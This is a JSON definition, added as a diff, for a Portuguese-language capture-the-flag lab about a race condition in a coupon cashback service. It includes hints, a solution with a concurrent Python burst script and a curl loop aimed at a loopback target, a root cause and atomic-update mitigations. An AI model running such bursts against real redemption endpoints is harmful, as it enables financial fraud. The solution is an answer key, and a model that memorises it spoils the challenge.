@@ -1,0 +1,83 @@
+{
+  "slug": "logic-coupon-race",
+  "title": "Estouro do contador de cupons",
+  "codename": "MERIDIAN COUPONS",
+  "summary": "O serviço de liquidação de cupons da Meridian verifica os usos restantes da campanha antes de creditar o cashback, mas a verificação e o decremento não são atômicos. Dispare uma rajada de resgates em paralelo para exceder os últimos usos, levar a carteira de liquidação além do founder tier e desbloquear o founder vault.",
+  "category": "logic",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "logic-coupon-race",
+  "estimated_minutes": 35,
+  "xp": 260,
+  "tech": [
+    "Flask",
+    "Threads",
+    "Race condition",
+    "REST API"
+  ],
+  "tags": [
+    "business-logic",
+    "race-condition",
+    "limit-overrun",
+    "toctou",
+    "coupons"
+  ],
+  "story": "A Meridian está fazendo uma campanha de encerramento: o cupom FOUNDER40 está limitado aos últimos usos, e cada resgate liquida 1500 créditos de cashback na carteira de liquidação da campanha. O setor promete que os resgates são 'serializados para ser justos', mas a chamada ao serviço antifraude acontece depois da verificação de usos restantes e antes do decremento do contador. O founder vault abre quando o saldo de liquidação alcança o founder tier. O financeiro presumiu que um cupom nunca poderia liquidar mais vezes que o orçamento restante.",
+  "objective": "Exceda o limite de usos restantes do FOUNDER40 com resgates em paralelo para que a carteira de liquidação alcance o founder tier e então leia a flag do founder vault.",
+  "rules": "Envie requisições concorrentes apenas para a origem loopback atribuída. Não faça varredura em outras portas. Reinicie o lab para restaurar o orçamento da campanha.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag do founder vault",
+      "flag_type": "root",
+      "points": 260,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Aritmética do orçamento",
+      "body": "Consulte `GET /api/coupons/status`: restam pouquíssimos usos e o cashback por resgate é fixo. Resgates honestos e sequenciais nunca alcançam o founder tier, porque o contador te impede antes.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "Uma rajada, não um loop",
+      "body": "`POST /api/coupons/redeem` com `code=FOUNDER40` verifica `uses_left` e depois espera ~50ms pelo serviço antifraude antes de decrementar. Envie muitos resgates exatamente ao mesmo tempo, por exemplo com um `ThreadPoolExecutor` ou `for i in $(seq 20); do curl -s -X POST -d 'code=FOUNDER40' .../api/coupons/redeem & done; wait`.",
+      "cost": 35
+    },
+    {
+      "level": 3,
+      "title": "Resgate o tier",
+      "body": "Cada requisição que entra na janela de corrida de 50ms liquida seu cashback. Assim que o saldo de liquidação alcançar o founder tier, acesse `/vault` para coletar a flag e registrar o objetivo.",
+      "cost": 45
+    }
+  ],
+  "solution": {
+    "walkthrough": "**Recon.** `GET /api/coupons/status` mostra `uses_left: 4`, `value: 1500` e o `balance` de liquidação. O founder tier é de 10000 créditos, então quatro resgates honestos liquidam apenas 6000.\n\n**Faça a corrida do contador.** `POST /api/coupons/redeem` executa um check-then-act:\n```python\nif COUPON['uses_left'] <= 0: return 409\ntime.sleep(0.05)          # fraud service call\nCOUPON['uses_left'] -= 1\nBALANCE += 1500\n```\nToda requisição que passa na verificação antes de algum decremento definitivo liquida um cashback completo. Envie uma rajada concorrente:\n```python\nfrom concurrent.futures import ThreadPoolExecutor\nimport httpx\n\nbase = 'http://127.0.0.1:PORT'\ndef redeem(_):\n    return httpx.post(f'{base}/api/coupons/redeem', data={'code': 'FOUNDER40'}, timeout=10).status_code\n\nwith ThreadPoolExecutor(max_workers=20) as pool:\n    print(list(pool.map(redeem, range(20))))\n# e.g. [200, 200, 200, 200, 200, 200, 200, 409, 409, 200, 409, ...]\nprint(httpx.get(f'{base}/api/coupons/status').json())\n# {'balance': 25525, 'uses_left': 0, ...}\n```\nSó a rajada importa: requisições sequenciais deixam de retornar 200 após o terceiro resgate.\n\n**Abra o vault.**\n```\nGET /vault\n```\nCom o saldo de liquidação acima de 10000, a página renderiza o founder vault e a flag, e chama `lab.objective_async(\"flag\", ...)`.",
+    "root_cause": "Um estouro de limite do tipo time-of-check to time-of-use (TOCTOU). A verificação de usos restantes e o decremento são duas etapas separadas com um atraso de 50ms do serviço antifraude entre elas, então toda requisição concorrente observa o mesmo valor antes do decremento e todas liquidam. A carteira de liquidação então é creditada muito além do orçamento restante do cupom.",
+    "mitigation": "Faça da verificação e do decremento uma única atualização condicional atômica (`UPDATE coupons SET uses_left = uses_left - 1 WHERE code = ? AND uses_left > 0`, depois verifique a contagem de linhas afetadas) e liquide o crédito na mesma transação. Serialize por cupom com row lock (`SELECT ... FOR UPDATE`), use idempotency keys por resgate e limite o valor total de cashback de uma campanha de forma independente do contador de usos."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — Race conditions: Limit overrun",
+      "url": "https://portswigger.net/web-security/race-conditions",
+      "source_type": "official",
+      "description": "Endpoints de uso único e com rate limit abusados com requisições paralelas, e como prevenir isso."
+    },
+    {
+      "title": "OWASP — Business Logic Security Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Decrementos condicionais atômicos, empilhamento de cupons e controles contra abuso de recursos que distribuem valor."
+    },
+    {
+      "title": "CWE-367 — Time-of-check Time-of-use (TOCTOU) Race Condition",
+      "url": "https://cwe.mitre.org/data/definitions/367.html",
+      "source_type": "standard",
+      "description": "Descrição canônica de fraquezas de check-then-use com mitigações."
+    }
+  ]
+}
